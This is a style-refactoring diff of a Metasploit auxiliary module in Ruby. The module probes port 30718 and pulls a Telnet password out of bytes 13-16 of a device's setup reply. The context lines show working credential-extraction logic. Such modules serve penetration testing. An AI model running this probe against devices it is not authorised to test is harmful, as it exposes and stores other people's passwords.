@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -27,8 +28,9 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::CHOST,
         Opt::RPORT(30718),
-        OptBool.new('CHECK_TCP', [false , 'Check TCP instead of UDP', false])
-      ], self.class)
+        OptBool.new('CHECK_TCP', [false, 'Check TCP instead of UDP', false])
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -40,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
         'LocalHost' => datastore['CHOST'] || nil,
         'PeerHost'  => ip,
         'PeerPort'  => datastore['RPORT'],
-        'Context'   =>  {
+        'Context' => {
           'Msf' => framework,
           'MsfExploit' => self
         }
@@ -55,24 +57,24 @@ class MetasploitModule < Msf::Auxiliary
         rem_sock = Rex::Socket::Udp.create(sock_opts)
       end
       rem_sock.put(setup_probe)
-      res = rem_sock.recvfrom(65535, 0.5) and res[1]
+      (res = rem_sock.recvfrom(65535, 0.5)) && res[1]
 
       password = parse_reply(res)
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
       print_error("Connection error")
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception => e
       print_error("Unknown error: #{e.class} #{e}")
     ensure
-      rem_sock.close if rem_sock
+      rem_sock&.close
     end
 
     if password
       if password == "\x00\x00\x00\x00"
         print_status("#{rhost} - Password isn't used, or secure")
       else
-        print_good("#{rhost} - Telnet password found: #{password.to_s}")
+        print_good("#{rhost} - Telnet password found: #{password}")
 
         service_data = {
           address: ip,
@@ -83,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
         }
 
         credential_data = {
-          module_fullname: self.fullname,
+          module_fullname: fullname,
           origin_type: :service,
           private_data: password.to_s,
           private_type: :password
@@ -106,11 +108,10 @@ class MetasploitModule < Msf::Auxiliary
     setup_record = pkt[0]
 
     # If response is a setup record, extract password bytes 13-16
-    if setup_record[3] and setup_record[3].ord == 0xF9
-      return setup_record[12,4]
+    if setup_record[3] && (setup_record[3].ord == 0xF9)
+      return setup_record[12, 4]
     else
       return nil
     end
   end
-
 end
